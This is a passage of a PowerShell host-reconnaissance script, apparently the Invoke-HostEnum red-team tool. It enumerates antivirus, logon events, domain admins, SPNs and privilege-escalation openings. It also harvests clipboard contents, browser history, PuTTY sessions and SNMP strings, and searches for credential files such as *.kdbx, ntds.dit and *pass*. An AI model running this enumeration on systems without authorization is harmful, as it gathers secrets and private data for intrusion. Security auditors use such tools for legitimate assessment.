            $Results = Get-ExplicitLogonEvents -Days 10 | Select TimeCreated,TargetUserName,TargetDomainName,ProcessName,SubjectUserName,SubjectDomainName | Sort-Object TimeCreated
            $Results | Format-Table -auto -wrap
            If ($HTMLReport) {
                    $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Explicit Logon Events (4648) - Last 10 Days</H2>" | Out-File -Append $HTMLReportFile
                }
            # Logon Events (Requires admin)
            "`n[+] Logon Events (4624) - Last 200 Events:`n"
            # Filter out NT Authority and Machine logons
            $Results = Get-LogonEvents -MaxEvents 200  | Where-Object {$_.Target -NotLike "NT AUTHORITY*" -and $_.Target -NotLike "*$"} |Sort-Object TimeCreated
            $Results | Format-Table -auto -wrap
            If ($HTMLReport) {
                    $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Logon Events (4624) - Last 200 Events</H2>" | Out-File -Append $HTMLReportFile
                }
            
            ## AV Products
            #########################
            "`n[+] Installed AV Product`n"
            $Results = Get-AVInfo
            $Results | Format-List
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed AV Product</H2>" -as list | Out-File -Append $HTMLReportFile
            }
            
            # Potential Running AV Processes
            "`n[+] Potential AV Processes`n"
            $Results = Get-AVProcesses
            $Results | Format-Table -Auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Potential AV Processes</H2>" | Out-File -Append $HTMLReportFile
            }

            # Windows Defender Status
            "`n[+] Windows Defender Status`n"
            $Results = Get-MpComputerStatus
            $Results | Format-Table -Auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Windows Defender Status</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # If McAfee is installed then pull some recent logs
            If ($Results.displayName -Match "mcafee") {
                $Results = Get-McafeeLogs
                $Results |Format-List
                If ($HTMLReport) {
                    $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Recent McAfee AV Logs</H2>" -as list | Out-File -Append $HTMLReportFile
                }
            }
            ## Interesting Locations
            #############################
            "`n[+] Registry Keys`n"
            $Results = Get-InterestingRegistryKeys
            $Results
            If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H2>Interesting Registry Keys</H2>`n<table><tr><td><PRE>$Results</PRE></td></tr></table>" -as list | Out-File -Append $HTMLReportFile
            }   
        
            # Interesting File Search (String formatted due to odd formatting issues with file listings)
            "`n[+] Interesting Files:`n"
            $Results = Get-InterestingFiles
            $Results
            If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H2>Interesting Files</H2>`n<table><tr><td><PRE>$Results</PRE></td></tr></table>" | Out-File -Append $HTMLReportFile
            }
            
            ## Current User Enumeration
            ############################
            # Group Membership for Current User
            "`n[+] Group Membership - $($Env:UserName)`n"
            $Results = Get-UserGroupMembership | Sort-Object SID
            $Results | Format-Table -Auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Group Membership - $($env:username)</H2>"| Out-File -Append $HTMLReportFile
            }
            
            # Browser History (IE, Firefox, Chrome)
            "`n[+] Browser History`n"
            $Results = Get-BrowserInformation | Where-Object{$_.Data -NotMatch "google" -And $_.Data -NotMatch "microsoft" -And $_.Data -NotMatch "chrome" -And $_.Data -NotMatch "youtube" }
            $Results | Format-Table Browser, DataType, User, Data -Auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -Property Browser, DataType, User, Data, Name -PreContent "<H2>Browser History</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Open IE Tabs
            "`n[+] Active Internet Explorer URLs - $($Env:UserName)`n"
            $Results = Get-ActiveIEURLS
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Active Internet Explorer URLs - $($Env:UserName)</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Recycle Bin Files
            "`n`n[+] Recycle Bin Contents - $($Env:UserName)`n"
            $Results = Get-RecycleBin
            $Results | Format-Table -Auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Recycle Bin Contents - $($Env:UserName)</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Clipboard Contents
            Add-Type -Assembly PresentationCore
            "`n[+] Clipboard Contents - $($Env:UserName):`n"
            $Results = ''
            $Results = ([Windows.Clipboard]::GetText()) -join "`r`n" | Out-String
            $Results
            If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H2>Clipboard Contents - $($Env:UserName)</H2><table><tr><td><PRE>$Results</PRE></td></tr></table>"| Out-File -Append $HTMLReportFile
            }
        
                
        }
    
        # Simple Domain Enumeration
        If ($Domain) {
            If ($HTMLReport) {
                    ConvertTo-HTML -Fragment -PreContent "<H1>Domain Report - $($env:USERDOMAIN)</H1><div class='aLine'></div>" | Out-File -Append $HTMLReportFile
                }
            # Check if host is part of a domain before executing domain enumeration functions
            If ((gwmi win32_computersystem).partofdomain){
                Write-Verbose "Enumerating Windows Domain..."
                "`n[+] Domain Mode`n"
                $Results = ([System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()).DomainMode
                $Results
                If ($HTMLReport) {
                    ConvertTo-HTML -Fragment -PreContent "<H2>Domain Mode: $Results</H2>" | Out-File -Append $HTMLReportFile
                }
                
                # DA Level Accounts
                "`n[+] Domain Administrators`n"
                $Results = Get-DomainAdmins
                $Results
                If ($HTMLReport) {
                    ConvertTo-HTML -Fragment -PreContent "<H2>Domain Administrators</H2><table><tr><td><PRE>$Results</PRE></td></tr></table>" | Out-File -Append $HTMLReportFile
                }
                
                # Domain account password policy
                "`n[+] Domain Account Policy`n"
                $Results = Get-DomainAccountPolicy
                $Results | Format-List
                If ($HTMLReport) {
                    $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Account Policy</H2>" -as List | Out-File -Append $HTMLReportFile
                }
                                
                # Domain Controllers
                "`n[+] Domain Controllers:`n"
                $Results = ([System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()).DomainControllers | Select-Object  Name,OSVersion,Domain,Forest,SiteName,IpAddress
                $Results | Format-Table -Auto   
                If ($HTMLReport) {
                    $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Controllers</H2>" | Out-File -Append $HTMLReportFile
                }
                
                # Domain Trusts
                "`n[+] Domain Trusts:`n"
                $Results = ([System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
                $Results | Format-List
                If ($HTMLReport) {
                    $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Trusts</H2>" -as List | Out-File -Append $HTMLReportFile
                }
                
                # Domain Users
                "`n[+] Domain Users:`n"
                $Results = Get-WmiObject -Class Win32_UserAccount | Select-Object Name,Caption,SID,Fullname,Disabled,Lockout,Description |Sort-Object SID
                $Results | Format-Table -Auto
                If ($HTMLReport) {
                    $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Users</H2>" | Out-File -Append $HTMLReportFile
                }
                
                # Domain Groups
                "`n[+] Domain Groups:`n"
                $Results = Get-WmiObject -Class Win32_Group | Select-Object Name,SID,Description | Sort-Object SID
                $Results | Format-Table -Auto
                If ($HTMLReport) {
                    $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Groups</H2>" | Out-File -Append $HTMLReportFile
                }
                
                # Domain Admins, Enterprise Admins, Server Admins, Backup Operators
                    
                # Get User SPNS
                "`n[+] User Account SPNs`n"
                $Results = $null
                $Results = Get-UserSPNS -UniqueAccounts | Sort-Object PasswordLastSet -Unique
                $Results | Format-Table -auto
                If ($HTMLReport) {
                    $Results | ConvertTo-HTML -Fragment -PreContent "<H2>User Account SPNs</H2>" | Out-File -Append $HTMLReportFile
                }
            }
            Else {
                "`n[-] Host is not a member of a domain. Skipping domain checks...`n"
                If ($HTMLReport) {
                    ConvertTo-HTML -Fragment -PreContent "<H2>Host is not a member of a domain. Domain checks skipped.</H2>" | Out-File -Append $HTMLReportFile
                }
            }
        }
    
        # Privilege Escalation Enumeration
        If ($Privesc) {
            If ($HTMLReport) {
                Invoke-AllChecks -HTMLReport
            }
            Else {
                Invoke-AllChecks
            }
        }
        # Determine the execution duration
        $Duration = New-Timespan -start $Time -end ((Get-Date).ToUniversalTime())
        
        # Print report location and finish execution
        
        "`n"
        If ($HTMLReport) {
            "[+] FILE:`t$HTMLReportFile"
            "[+] FILESIZE:`t$((Get-Item $HTMLReportFile).length) Bytes"
        }
        "[+] DURATION:`t$Duration"
        "[+] Invoke-HostEnum complete!"
    }
    
    
    function Get-SysInfo {
    <#
      .SYNOPSIS
    
      Gets basic system information from the host
    
    #>
        $os_info = gwmi Win32_OperatingSystem
        $uptime = [datetime]::ParseExact($os_info.LastBootUpTime.SubString(0,14), "yyyyMMddHHmmss", $null)
        $uptime = (Get-Date).Subtract($uptime)
        $uptime = ("{0} Days, {1} Hours, {2} Minutes, {3} Seconds" -f ($uptime.Days, $uptime.Hours, $uptime.Minutes, $uptime.Seconds))
        $date = Get-Date
        $IsHighIntegrity = [bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        
        $SysInfoHash = @{            
            HOSTNAME                = $ENV:COMPUTERNAME                         
            IPADDRESSES             = (@([System.Net.Dns]::GetHostAddresses($ENV:HOSTNAME)) | %{$_.IPAddressToString}) -join ", "        
            OS                      = $os_info.caption + ' ' + $os_info.CSDVersion     
            ARCHITECTURE            = $os_info.OSArchitecture   
            "DATE(UTC)"             = $date.ToUniversalTime()| Get-Date -uformat  "%Y%m%d%H%M%S"
            "DATE(LOCAL)"           = $date | Get-Date -uformat  "%Y%m%d%H%M%S%Z"
            INSTALLDATE             = $os_info.InstallDate
            UPTIME                  = $uptime           
            USERNAME                = $ENV:USERNAME           
            DOMAIN                  = (GWMI Win32_ComputerSystem).domain            
            LOGONSERVER             = $ENV:LOGONSERVER          
            PSVERSION               = $PSVersionTable.PSVersion.ToString()
            PSCOMPATIBLEVERSIONS    = ($PSVersionTable.PSCompatibleVersions) -join ', '
            PSSCRIPTBLOCKLOGGING    = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -EA 0).EnableScriptBlockLogging -eq 1){"Enabled"} Else {"Disabled"}
            PSTRANSCRIPTION         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).EnableTranscripting -eq 1){"Enabled"} Else {"Disabled"}
            PSTRANSCRIPTIONDIR      = (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).OutputDirectory
            PSMODULELOGGING         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging -EA 0).EnableModuleLogging -eq 1){"Enabled"} Else {"Disabled"}
            LSASSPROTECTION         = If((Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -EA 0).RunAsPPL -eq 1){"Enabled"} Else {"Disabled"}
            LAPS                    = If((Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd" -EA 0).AdmPwdEnabled -eq 1){"Enabled"} Else {"Disabled"}
            UAC                     = If((Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -EA 0).EnableLUA -eq 1){"Enabled"} Else {"Disabled (UAC is Disabled)"}
            # LocalAccountTokenFilterPolicy = 1 disables local account token filtering for all non-rid500 accounts
            UACLOCALACCOUNTTOKENFILTERPOLICY       = If((Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -EA 0).LocalAccountTokenFilterPolicy -eq 1){"Disabled (PTH likely w/ non-RID500 Local Admins)"} Else {"Enabled (Remote Administration restricted for non-RID500 Local Admins)"}
            UACFILTERADMINISTRATORTOKEN     = If((Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -EA 0).FilterAdministratorToken -eq 1){"Enabled (RID500 protected)"} Else {"Disabled (PTH likely with RID500 Account)"}
            HIGHINTEGRITY           = $IsHighIntegrity
            DENYRDPCONNECTIONS      = [bool](Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -EA 0).FDenyTSConnections
        }      
                    
        # PS feels the need to randomly re-order everything when converted to an object so let's presort
        New-Object -TypeName PSobject -Property $SysInfoHash | Select-Object Hostname, OS, Architecture, "Date(UTC)", "Date(Local)", InstallDate, UpTime, IPAddresses, Domain, Username, LogonServer, PSVersion, PSCompatibleVersions, PSScriptBlockLogging, PSTranscription, PSTranscriptionDir, PSModuleLogging, LSASSProtection, LAPS, UAC, UACLocalAccountTokenFilterPolicy, UACFilterAdministratorToken, HighIntegrity
    }
        
    function Get-ProcessInfo() {
    <#
      .SYNOPSIS
    
      Gets detailed process information via WMI
    
    #>  
        # Extra work here to include process owner and commandline using WMI
        Write-Verbose "Enumerating running processes..."
        $owners = @{}
        $commandline = @{}
    
        gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
        gwmi win32_process |% {$commandline[$_.handle] = $_.commandline}
    
        $procs = Get-Process | Sort-Object -property ID
        $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "Owner" -Value $owners[$_.id.tostring()] -force}
        $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "CommandLine" -Value $commandline[$_.id.tostring()] -force}
    
        Return $procs
    }
    
    function Get-LocalUsers {
    <#
        .SYNOPSIS
        Pulls local users and some of their properties. 
    
        .DESCRIPTION
        Uses the [ADSI] object type to query user objects for group membership, password expiration, etc
    
        .LINK
        This function borrows the ADSI code from the following link:
        http://www.bryanvine.com/2015/08/powershell-script-get-localusers.html
    
    #>
    
        $LocalUsers = Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$($env:ComputerName)'"
    
        # Pull some additional properties that we don't get through Win32_UserAccount
        $LocalUserProps = ([ADSI]"WinNT://$env:computerName").Children | ?{$_.SchemaClassName -eq 'user'} | %{
                $_ | Select @{n='UserName';e={$_.Name}},
                @{n='Disabled';e={if(($_.userflags.value -band 2) -eq 2){$true} else{$false}}},
                @{n='PasswordExpired';e={if($_.PasswordExpired){$true} else{$false}}},
                @{n='PasswordNeverExpires';e={if(($_.userflags.value -band 65536) -eq 65536){$true} else{$false}}},
                @{n='PasswordAge';e={if($_.PasswordAge[0] -gt 0){[DateTime]::Now.AddSeconds(-$_.PasswordAge[0])} else {$null}}},
                @{n='LastLogin';e={$_.LastLogin}},
                @{n='Description';e={$_.Description}},
                @{n='UserFlags';e={$_.userflags}}
            }
        
        # Add PasswordAge and LastLogin properties to our users enumerated via WMI
        $passwordage = @{}
        $lastlogin = @{}
    
        $LocalUserProps |%{$passwordage[$_.UserName] = $_.PasswordAge}
        $LocalUserProps |%{$lastlogin[$_.UserName] = $_.LastLogin}
    
        $LocalUsers | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "PasswordLastSet" -Value $passwordage[$_.Name] -force}
        $Localusers | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "LastLogin" -Value $lastlogin[$_.Name] -force}
        
        $LocalUsers
    }

        function Get-LocalStandardUsers {
    <#
        .SYNOPSIS
        Pulls local users and some of their properties. 
    
        .DESCRIPTION
        Uses the [ADSI] object type to query user objects for group membership, password expiration, etc
    
        .LINK
        This function borrows the ADSI code from the following link:
        http://www.bryanvine.com/2015/08/powershell-script-get-localusers.html
    
    #>
    
        $LocalUsers = Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$($env:ComputerName)'"
    
        # Pull some additional properties that we don't get through Win32_UserAccount
        $LocalUserProps = ([ADSI]"WinNT://$env:computerName").Children | ?{$_.SchemaClassName -eq 'user'} | %{
                $_ | Select-Object -Property @{n='UserName';e={$_.Name}},
                @{n='Disabled';e={if(($_.userflags.value -band 2) -eq 2){$true} else{$false}}},
                @{n='PasswordExpired';e={if($_.PasswordExpired){$true} else{$false}}},
                @{n='PasswordNeverExpires';e={if(($_.userflags.value -band 65536) -eq 65536){$true} else{$false}}},
                @{n='PasswordAge';e={if($_.PasswordAge[0] -gt 0){[DateTime]::Now.AddSeconds(-$_.PasswordAge[0])} else {$null}}},
                @{n='LastLogin';e={$_.LastLogin}},
                @{n='Description';e={$_.Description}},
                @{n='UserFlags';e={$_.userflags}}
            }
        
        # Add PasswordAge and LastLogin properties to our users enumerated via WMI
        $passwordage = @{}
        $lastlogin = @{}
    
        $LocalUserProps |%{$passwordage[$_.UserName] = $_.PasswordAge}
        $LocalUserProps |%{$lastlogin[$_.UserName] = $_.LastLogin}
    
        $LocalUsers | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "PasswordLastSet" -Value $passwordage[$_.Name] -force}
        $Localusers | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "LastLogin" -Value $lastlogin[$_.Name] -force}
        $localStandardUsers = $LocalUsers | Where-Object {[int]($_.SID.tostring().Split([char]0x2d)[7]) -gt [int]999}
        return $localStandardUsers
    }
        
    function Get-UserGroupMembership {
    <#
      .SYNOPSIS
    
      Pulls local group membership for the current user
     
    #>
        Write-Verbose "Enumerating current user local group membership..."
        
        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -expand value
        $Groups = ForEach ($sid in $CurrentUserSids) {
            $SIDObj = New-Object System.Security.Principal.SecurityIdentifier("$sid")
            $GroupObj = New-Object -TypeName PSObject -Property @{
                        SID = $sid
                        GroupName = $SIDObj.Translate([System.Security.Principal.NTAccount])
            }
            $GroupObj
        }
        $Groups
    }
    
    function Get-ActiveTCPConnections {
    <#
      .SYNOPSIS
    
      Enumerates active TCP connections for IPv4 and IPv6
      Adapted from Beau Bullock's TCP code
      https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1
    
    #>
        Write-Verbose "Enumerating active network connections..."
        $IPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
        $Connections = $IPProperties.GetActiveTcpConnections()            
        foreach($Connection in $Connections) {            
            if($Connection.LocalEndPoint.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }            
            New-Object -TypeName PSobject -Property @{           
                "LocalAddress"  = $Connection.LocalEndPoint.Address            
                "LocalPort"     = $Connection.LocalEndPoint.Port            
                "RemoteAddress" = $Connection.RemoteEndPoint.Address            
                "RemotePort"    = $Connection.RemoteEndPoint.Port            
                "State"         = $Connection.State            
                "IPVersion"     = $IPType            
            }
        }
    }
        
    function Get-ActiveListeners {
    <#
      .SYNOPSIS
    
      Enumerates active TCP/UDP listeners.
    
    #>
        Write-Verbose "Enumerating active TCP/UDP listeners..."     
        $IPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()         
        $TcpListeners = $IPProperties.GetActiveTCPListeners()
        $UdpListeners = $IPProperties.GetActiveUDPListeners()
                
        ForEach($Connection in $TcpListeners) {            
            if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }                 
            New-Object -TypeName PSobject -Property @{          
                "Protocol"      = "TCP"
                "LocalAddress"  = $Connection.Address            
                "ListeningPort" = $Connection.Port            
                "IPVersion"     = $IPType
            }
        }
        ForEach($Connection in $UdpListeners) {            
            if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }                 
            New-Object -TypeName PSobject -Property @{          
                "Protocol"      = "UDP"
                "LocalAddress"  = $Connection.Address            
                "ListeningPort" = $Connection.Port            
                "IPVersion"     = $IPType
            }
        }
    }
    
    function Get-FirewallStatus {
    <#
      .SYNOPSIS
    
      Enumerates local firewall status from registry
     
    #>
        $regkey = "HKLM:\System\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy"
        New-Object -TypeName PSobject -Property @{
            Standard    = If ((Get-ItemProperty $regkey\StandardProfile).EnableFirewall -eq 1){"Enabled"}Else {"Disabled"}
            Domain      = If ((Get-ItemProperty $regkey\DomainProfile).EnableFirewall -eq 1){"Enabled"}Else {"Disabled"}
            Public      = If ((Get-ItemProperty $regkey\PublicProfile).EnableFirewall -eq 1){"Enabled"}Else {"Disabled"}
        }
    }
        
    function Get-InterestingRegistryKeys {
    <#
      .SYNOPSIS
    
      Pulls potentially interesting registry keys
    
    #>
        Write-Verbose "Enumerating registry keys..."            
        
        # Recently typed "run" commands
        "`n[+] Recent RUN Commands:`n"
        Get-Itemproperty "HKCU:\software\microsoft\windows\currentversion\explorer\runmru" | Out-String
    
        # HKLM SNMP Keys
        "`n[+] SNMP community strings:`n"
        Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" | Format-List | Out-String
        
        # HKCU SNMP Keys 
        "`n[+] SNMP community strings for current user:`n"
        Get-ItemProperty "HKCU:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities"| Format-List |Out-String
        
        # Putty Saved Session Keys
        "`n[+] Putty saved sessions:`n"
        Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\*" |Format-List | Out-String
        
        "`n[+] Windows Update Settings:`n"
        Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" |Format-List | Out-String
    
        "`n[+] Kerberos Settings:`n"
        Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" |Format-List | Out-String
    
        "`n[+] Wdigest Settings:`n"
        Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\SecurityProviders\WDigest" |Format-List | Out-String
    
        "`n[+] Windows Installer Settings:`n"
        Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\Installer" |Format-List | Out-String
        Get-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\Installer" |Format-List | Out-String
    
        "`n[+] Windows Policy Settings:`n"
        Get-ChildItem registry::HKEY_LOCAL_MACHINE\Software\Policies -recurse | Out-String
        Get-ChildItem registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies -recurse | Out-String
        Get-ChildItem registry::HKEY_CURRENT_USER\Software\Policies -recurse | Out-String
        Get-ChildItem registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies -recurse | Out-String
    }
    
    
    function Get-IndexedFiles {
    <#
      .SYNOPSIS
    
      Uses the Windows indexing service to search for interesting files and often includes Outlook e-mails.
      Code originally adapted from a Microsoft post, but can no longer locate the exact source. Doesn't work on all systems.
    
    #>
    param (
        [Parameter(Mandatory=$true)][string]$Pattern)  
    
        if($Path -eq ""){$Path = $PWD;} 
    
        $pattern = $pattern -replace "\*", "%"  
        $path = $path + "\%"
    
        $con = New-Object -ComObject ADODB.Connection
        $rs = New-Object -ComObject ADODB.Recordset
    
        # This directory indexing search doesn't work on some systems tested (i.e.Server 2K8r2)
        # Using Try/Catch to break the search in case the provider isn't available
        Try {
            $con.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")}
        Catch {
            "[-] Indexed file search provider not available";Break
        }
        $rs.Open("SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '" + $pattern + "' " , $con)
    
        While(-Not $rs.EOF){
            $rs.Fields.Item("System.ItemPathDisplay").Value
            $rs.MoveNext()
        }
    }

    function Get-SystemFilePermissions {
        foreach($user in Get-LocalStandardUsers) {
        Write-Verbose -Message 'Enumerating system files...'
        Get-ChildItem -Path "$env:windir\system32\drivers\etc\hosts" -ErrorAction SilentlyContinue | Get-EffectiveAccess -Principal $user.Name
        Get-ChildItem -Path "$env:windir\system32\drivers\etc\lmhosts.sam" -ErrorAction SilentlyContinue | Get-EffectiveAccess -Principal $user.Name
        Get-ChildItem -Path "$env:windir\repair\SAM" -ErrorAction SilentlyContinue | Get-EffectiveAccess -Principal $user.Name
        Get-ChildItem -Path "$env:windir\System32\config\RegBack\SAM" -ErrorAction SilentlyContinue | Get-EffectiveAccess -Principal $user.Name
        Get-ChildItem -Path "$env:windir\System32\config\SAM" -ErrorAction SilentlyContinue | Get-EffectiveAccess -Principal $user.Name
        Get-ChildItem -Path "$env:windir\repair\system" -ErrorAction SilentlyContinue | Get-EffectiveAccess -Principal $user.Name
        Get-ChildItem -Path "$env:windir\System32\config\SYSTEM" -ErrorAction SilentlyContinue | Get-EffectiveAccess -Principal $user.Name
        Get-ChildItem -Path "$env:windir\System32\config\RegBack\system" -ErrorAction SilentlyContinue | Get-EffectiveAccess -Principal $user.Name
        }
    }

    function Get-ServiceFilePermissions {
        [array]$executables = $null
        foreach($user in Get-LocalStandardUsers) {
            $Services = Get-WmiObject win32_service | Select-Object Name, DisplayName, State, PathName, StartName
            foreach($service in $Services) 
            {
                $ServicePermissions =  get-service -Name $service.Name | Get-EffectiveAccess -Principal $user.Name -ErrorAction SilentlyContinue | Select-Object EffectiveAccess
                $Executable         =  $service.PathName -split ".exe"
                if($Executable -ne $null){$PathName = ($Executable[0] + ".exe").Replace("`"","")}
                $EffectiveAccess    =  $PathName.tostring() | Get-EffectiveAccess -Principal $user.Name -ErrorAction SilentlyContinue | Select-Object EffectiveAccess
                $Object             =  New-Object -TypeName PSObject -Property @{
                    LocalUser          = $user.Name
                    ServiceName        = $service.Name
                    LogOnAccount       = $service.StartName
                    ServiceDisplayName = $service.DisplayName
                    State              = $service.State
                    BinPath            = $PathName.tostring()
                    BinPathPermissions = $EffectiveAccess.EffectiveAccess
                    ServicePermissions = $ServicePermissions.EffectiveAccess
                }
            $executables            += $Object
            }
        }
        return $executables
    }

    function Get-ScheduledTaskFilePermissions {
        [array]$executables = $null
        foreach($LocalUser in Get-LocalStandardUsers) {
            $ScheduledTasks = Get-ScheduledTask
            foreach($ScheduledTask in $ScheduledTasks) 
            {
                If($ScheduledTask.Actions.Execute -ne $null)
                {
                    $ScheduledTaskBinPath = $ScheduledTask.Actions.Execute
                    if($ScheduledTaskBinPath -ne $null){$ScheduledTaskBinPath = $ScheduledTaskBinPath.Replace("`"","")}
                    if($ScheduledTaskBinPath -inotmatch "\\" -and $ScheduledTaskBinPath -ne $null) {$ScheduledTaskBinPath = "%SystemRoot%\System32\" + $ScheduledTaskBinPath}
                    $CMDPermissions       = if($ScheduledTaskBinPath.ToString() -ne $null){$ScheduledTaskBinPath.ToString() | Get-EffectiveAccess -Principal $localuser.Name -ErrorAction SilentlyContinue | Select-Object EffectiveAccess}
                    $Object               = New-Object -TypeName PSObject -Property @{
                        LocalUser         = $LocalUser.Name
                        TaskName          = $ScheduledTask.TaskName
                        TaskPath          = $ScheduledTask.TaskPath
                        Author            = $ScheduledTask.Author
                        CMDPath           = $ScheduledTaskBinPath
                        CMDPermissions    = $CMDPermissions.EffectiveAccess
                        Enabled           = $ScheduledTask.Settings.Enabled
                        RunAsUser         = $ScheduledTask.Principal.UserId
                        RunLevel          = $ScheduledTask.Principal.RunLevel
                        RequiredPrivilege = $ScheduledTask.Principal.RequiredPrivilege
                    }
                }
            $executables += $Object
            }
        }
    return $executables
    }


    function Get-InterestingFiles {
    <#
      .SYNOPSIS
    
      Local filesystem enumeration
    
    #>
        
        Write-Verbose "Enumerating interesting files..."
    
        # Get Indexed files containg $searchStrings (Experimental), edit this to desired list of "dirty words"
        $SearchStrings = "*secret*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora","ntds.dit","*.dll.config","*.exe.config"
        write-host "index Files"
        # $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}
        
        #"`n[+] Indexed File Search:`n"
        #"`n[+] Search Terms ($SearchStrings)`n`n"
        # $IndexedFiles |Format-List |Out-String -width 300
        write-host "FileSystem Drives"
        # Get Top Level file listing of all drives
        "`n[+] All 'FileSystem' Drives - Top Level Listing:`n"
        Get-PSdrive -psprovider filesystem |ForEach-Object {Get-ChildItem $_.Root} |Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 300
        
        write-host "Program Files"
        # Get Program Files
        "`n[+] System Drive - Program Files:`n"
        GCI "$ENV:ProgramFiles\" | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 300
        
        write-host "Program Files (x86)"
        # Get Program Files (x86)
        "`n[+] System Drive - Program Files (x86):`n"
        GCI "$ENV:ProgramFiles (x86)\" | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 300

        write-host "User Desktop"
        # Get %USERPROFILE%\Desktop top level file listing
        "`n[+] Current User Desktop:`n"
        GCI $ENV:USERPROFILE\Desktop | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 300

        write-host "User Documents"
        # Get %USERPROFILE%\Documents top level file listing
        "`n[+] Current User Documents:`n"
        GCI $ENV:USERPROFILE\Documents | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 300

        write-host "User Profile"   
        # Get Files in the %USERPROFILE% directory with certain extensions or phrases
        "`n[+] Current User Profile (*pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.key,KeePass.config):`n"
        GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 300

        write-host "Powershell History"
        # Get Powershell History
